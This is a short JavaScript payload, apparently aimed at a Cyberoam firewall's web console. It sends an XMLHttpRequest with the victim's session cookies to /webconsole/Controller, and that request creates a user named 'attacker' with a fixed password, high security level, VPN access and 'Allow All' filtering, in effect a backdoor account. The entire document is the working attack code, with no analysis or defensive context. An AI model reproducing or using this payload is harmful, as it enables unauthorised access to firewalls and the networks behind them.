console.log("starting");
var params = "mode=31&json=%7B%22username%22%3A%22attacker%22%2C%22description%22%3A%22attacker%22%2C%22save%22%3A%22save%22%2C%22spamdigestparam%22%3A%22on%22%2C%22createdby%22%3A%22cyberoam%22%2C%22sslvpnpolicyparam%22%3A%22on%22%2C%22name%22%3A%22attacker%22%2C%22passwd%22%3A%22Password123!%22%2C%22email%22%3A%5B%22attacker%40example.com%22%5D%2C%22securitylevel%22%3A%225%22%2C%22groupid%22%3A%22Open+Group%22%2C%22webfilterid_cat%22%3A%22Web+Filter%22%2C%22webfilterid%22%3A%22Allow+All%22%2C%22appfilterid_cat%22%3A%22Application+Filter%22%2C%22appfilterid%22%3A%22Allow+All%22%2C%22surfingquotaid_cat%22%3A%22Surfing+Quota%22%2C%22surfingquotaid%22%3A%22Unlimited+Internet+Access%22%2C%22accesspolicyid_cat%22%3A%22Access+Time%22%2C%22accesspolicyid%22%3A%22Allowed+all+the+time%22%2C%22datatransferpolicyid_cat%22%3A%22Data+Transfer%22%2C%22datatransferpolicyid%22%3A%22None%22%2C%22bwpolicyid_cat%22%3A%22Bandwidth%22%2C%22bwpolicyid%22%3A%22None%22%2C%22l2tp%22%3A%220%22%2C%22pptp%22%3A%220%22%2C%22spamdigest%22%3A%221%22%2C%22maxloginfromglobal%22%3A%221%22%2C%22macbinding%22%3A%222%22%2C%22openorselective%22%3A%22allowgroup%22%2C%22scheduleid%22%3A%22NULL%22%2C%22appLoginRestriction%22%3A%22allowall%22%7D&__RequestType=ajax";
console.log(params);

var xhr = new XMLHttpRequest();
xhr.open("POST", "/webconsole/Controller?", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.withCredentials = true; // Ensure cookies are sent with the request
console.log("Sending XHR request...");
xhr.send(params);



